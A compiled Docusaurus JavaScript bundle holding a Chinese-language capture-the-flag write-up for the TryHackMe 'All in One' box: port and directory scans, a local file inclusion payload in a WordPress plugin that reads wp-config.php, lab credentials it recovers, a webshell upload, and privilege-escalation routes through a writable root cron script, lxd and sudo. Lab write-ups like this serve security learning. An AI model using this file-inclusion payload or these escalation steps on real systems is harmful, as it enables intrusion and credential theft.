"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[9184],{18255:(n,e,t)=>{t.r(e),t.d(e,{assets:()=>l,contentTitle:()=>i,default:()=>p,frontMatter:()=>r,metadata:()=>o,toc:()=>c});var s=t(74848),a=t(28453);const r={sidebar_position:42,tags:["Easy","Linux","\u6587\u4ef6\u5305\u542b","\u5b9a\u65f6\u4efb\u52a1","lxd","SUDO","\u5bc6\u7801\u91cd\u7528"],title:"All in One",description:"All in One",sidebar_label:"All in One",slug:"/tryhackme/42"},i="All in One",o={id:"box/TryHackMe/42",title:"All in One",description:"All in One",source:"@site/docs/box/TryHackMe/42.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/42",permalink:"/docs/tryhackme/42",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"\u6587\u4ef6\u5305\u542b",permalink:"/docs/tags/\u6587\u4ef6\u5305\u542b"},{label:"\u5b9a\u65f6\u4efb\u52a1",permalink:"/docs/tags/\u5b9a\u65f6\u4efb\u52a1"},{label:"lxd",permalink:"/docs/tags/lxd"},{label:"SUDO",permalink:"/docs/tags/sudo"},{label:"\u5bc6\u7801\u91cd\u7528",permalink:"/docs/tags/\u5bc6\u7801\u91cd\u7528"}],version:"current",sidebarPosition:42,frontMatter:{sidebar_position:42,tags:["Easy","Linux","\u6587\u4ef6\u5305\u542b","\u5b9a\u65f6\u4efb\u52a1","lxd","SUDO","\u5bc6\u7801\u91cd\u7528"],title:"All in One",description:"All in One",sidebar_label:"All in One",slug:"/tryhackme/42"},sidebar:"boxSidebar",previous:{title:"Blueprint",permalink:"/docs/tryhackme/41"},next:{title:"Res",permalink:"/docs/tryhackme/43"}},l={},c=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"FTP - 21",id:"ftp---21",level:2},{value:"HTTP - 80",id:"http---80",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"www-data",id:"www-data",level:3},{value:"www-data --&gt; root",id:"www-data----root",level:3},{value:"\u5229\u7528 elyana \u7528\u6237",id:"\u5229\u7528-elyana-\u7528\u6237",level:3}];function d(n){const e={code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,a.R)(),...n.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(e.h1,{id:"all-in-one",children:"All in One"}),"\n",(0,s.jsx)(e.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"root@ip-10-10-15-42:~/allinonemj# nmap -sT -p- --min-rate 1000 10.10.26.217\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-08-29 03:58 BST\nNmap scan report for ip-10-10-26-217.eu-west-1.compute.internal (10.10.26.217)\nHost is up (0.00033s latency).\nNot shown: 65532 closed ports\nPORT   STATE SERVICE\n21/tcp open  ftp\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 02:13:86:C1:B3:31 (Unknown)\n\nNmap done: 1 IP address (1 host up) scanned in 2.23 seconds\nroot@ip-10-10-15-42:~/allinonemj# nmap -sTCV -p 21,22,80 --min-rate 1000 10.10.26.217\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-08-29 03:58 BST\nNmap scan report for ip-10-10-26-217.eu-west-1.compute.internal (10.10.26.217)\nHost is up (0.00014s latency).\n\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.3\n|_ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| ftp-syst: \n|   STAT: \n| FTP server status:\n|      Connected to ::ffff:10.10.15.42\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 4\n|      vsFTPd 3.0.3 - secure, fast, stable\n|_End of status\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 e2:5c:33:22:76:5c:93:66:cd:96:9c:16:6a:b3:17:a4 (RSA)\n|   256 1b:6a:36:e1:8e:b4:96:5e:c6:ef:0d:91:37:58:59:b6 (ECDSA)\n|_  256 fb:fa:db:ea:4e:ed:20:2b:91:18:9d:58:a0:6a:50:ec (EdDSA)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Apache2 Ubuntu Default Page: It works\nMAC Address: 02:13:86:C1:B3:31 (Unknown)\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 7.46 seconds\n"})}),"\n",(0,s.jsx)(e.h2,{id:"ftp---21",children:"FTP - 21"}),"\n",(0,s.jsx)(e.p,{children:"\u4f7f\u7528\u4f60\u4eec\u8eab\u4efd\u767b\u9646 FTP \u670d\u52a1, \u6211\u53d1\u73b0\u8fd9\u53ea\u662f\u4e00\u4e2a\u76ee\u5f55\u4ec0\u4e48\u4e5f\u6ca1\u6709, \u5e76\u4e14\u4e5f\u6ca1\u6709\u4e0a\u4f20\u6587\u4ef6\u7684\u6743\u9650, \u90a3\u8fd9\u57fa\u672c\u6ca1\u6709\u7528\u4e86"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240628224231.png",alt:"20240628224231"})}),"\n",(0,s.jsx)(e.h2,{id:"http---80",children:"HTTP - 80"}),"\n",(0,s.jsx)(e.p,{children:"\u8fdb\u884c\u76ee\u5f55\u626b\u63cf, \u6211\u53d1\u73b0\u5b58\u5728\u4e00\u4e2a wordpress \u9875\u9762"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"root@ip-10-10-15-42:~/allinonemj# gobuster dir -u http://10.10.26.217/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.26.217/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Extensions:     php,txt,html\n[+] Timeout:        10s\n===============================================================\n2023/08/29 04:00:08 Starting gobuster\n===============================================================\n/index.html (Status: 200)\n/wordpress (Status: 301)\n/hackathons (Status: 200)\n"})}),"\n",(0,s.jsx)(e.p,{children:"\u8bbf\u95ee wordpress \u9875\u9762, \u4f7f\u7528 wpscan \u8fdb\u884c\u626b\u63cf\u53d1\u73b0\u4e00\u4e2a\u53ef\u4ee5\u5229\u7528\u7684\u6f0f\u6d1e"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240628224336.png",alt:"20240628224336"})}),"\n",(0,s.jsx)(e.p,{children:"\u5728\u5b98\u7f51\u4e5f\u7ed9\u51fa\u4e86\u5bf9\u5e94\u7684\u68c0\u6d4b\u65b9\u6cd5"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240628224355.png",alt:"20240628224355"})}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240628224403.png",alt:"20240628224403"})}),"\n",(0,s.jsx)(e.p,{children:"\u4f7f\u7528 PHP \u4f2a\u534f\u8bae\u8fdb\u884c\u8bfb\u53d6"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"http://10.10.26.217/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php\n"})}),"\n",(0,s.jsx)(e.p,{children:"\u89e3\u5bc6\u540e\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u5173\u4e8e\u6570\u636e\u5e93\u7684\u7528\u6237\u548c\u5bc6\u7801"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"/** MySQL database username */\ndefine( 'DB_USER', 'elyana' );\n\n/** MySQL database password */\ndefine( 'DB_PASSWORD', 'H@ckme@123' );\n"})}),"\n",(0,s.jsx)(e.p,{children:"\u540c\u65f6\u6211\u8bb0\u5f97\u5728\u8be5\u7ad9\u70b9\u6709\u4e00\u4e2a\u7528\u6237\u662f elyana \u56e0\u6b64\u6211\u5c06\u6b64\u5bc6\u7801\u7528\u4e8e\u767b\u9646\u53d1\u73b0\u53ef\u4ee5,\u63a5\u7740\u5c31\u662f\u4e0a\u4f20 WebShell"}),"\n",(0,s.jsx)(e.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,s.jsx)(e.h3,{id:"www-data",children:"www-data"}),"\n",(0,s.jsx)(e.p,{children:"\u8bbf\u95ee\u4e0a\u4f20\u7684 WebShell, \u6765\u83b7\u53d6 Shell"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240628224446.png",alt:"20240628224446"})}),"\n",(0,s.jsx)(e.h3,{id:"www-data----root",children:"www-data --\x3e root"}),"\n",(0,s.jsxs)(e.p,{children:["\u67e5\u770b ",(0,s.jsx)(e.code,{children:"/etc/crontab"})," \u6211\u53d1\u73b0\u6709\u4e00\u4e2a root \u7684\u5b9a\u65f6\u4efb\u52a1"]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"(remote) elyana@elyana:/tmp$ cat /etc/crontab\n# /etc/crontab: system-wide crontab\n# Unlike any other crontab you don't have to run the `crontab'\n# command to install the new version when you edit this file\n# and files in /etc/cron.d. These files also have username fields,\n# that none of the other crontabs do.\n\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n# m h dom mon dow user\tcommand\n17 *\t* * *\troot    cd / && run-parts --report /etc/cron.hourly\n25 6\t* * *\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )\n47 6\t* * 7\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )\n52 6\t1 * *\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )\n*  *    * * *   root    /var/backups/script.sh\n\n(remote) elyana@elyana:/tmp$ ls -al /var/backups/script.sh\n-rwxrwxrwx 1 root root 73 Oct  7  2020 /var/backups/script.sh\n"})}),"\n",(0,s.jsx)(e.h3,{id:"\u5229\u7528-elyana-\u7528\u6237",children:"\u5229\u7528 elyana \u7528\u6237"}),"\n",(0,s.jsx)(e.p,{children:"\u8bbf\u95ee\u7528\u6237 elyana \u5bb6\u76ee\u5f55\u6211\u53d1\u73b0\u4e00\u6bb5\u63d0\u793a"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240628224617.png",alt:"20240628224617"})}),"\n",(0,s.jsx)(e.p,{children:"\u56e0\u6b64\u6211\u5f00\u59cb\u641c\u5bfb\u5c5e\u4e8e\u7528\u6237 elyana \u7684\u6587\u4ef6"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240628224629.png",alt:"20240628224629"})}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"(remote) www-data@elyana:/tmp$ cat /etc/mysql/conf.d/private.txt\nuser: elyana\npassword: E@syR18ght\n"})}),"\n",(0,s.jsx)(e.p,{children:"\u4f7f\u7528\u4e0a\u9762\u7684\u5bc6\u7801\u8fdb\u884c\u767b\u9646, \u53d1\u73b0\u53ef\u4ee5\u767b\u9646, \u5e76\u4e14\u53d1\u73b0\u7528\u6237\u5177\u6709 sudo \u7279\u6743\u4ee5\u53ca\u662f lxd \u7ec4\u7528\u6237"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240628224647.png",alt:"20240628224647"})}),"\n",(0,s.jsx)(e.p,{children:"\u56e0\u6b64\u8fd9\u91cc\u6709\u4e24\u4e2a\u63d0\u6743\u65b9\u5f0f:"}),"\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsx)(e.li,{children:"lxd \u5bb9\u5668\u63d0\u6743"}),"\n",(0,s.jsx)(e.li,{children:"sudo \u7279\u6743\u8fdb\u884c\u63d0\u6743"}),"\n"]})]})}function p(n={}){const{wrapper:e}={...(0,a.R)(),...n.components};return e?(0,s.jsx)(e,{...n,children:(0,s.jsx)(d,{...n})}):d(n)}},28453:(n,e,t)=>{t.d(e,{R:()=>i,x:()=>o});var s=t(96540);const a={},r=s.createContext(a);function i(n){const e=s.useContext(r);return s.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function o(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(a):n.components||a:i(n.components),s.createElement(r.Provider,{value:e},n.children)}}}]);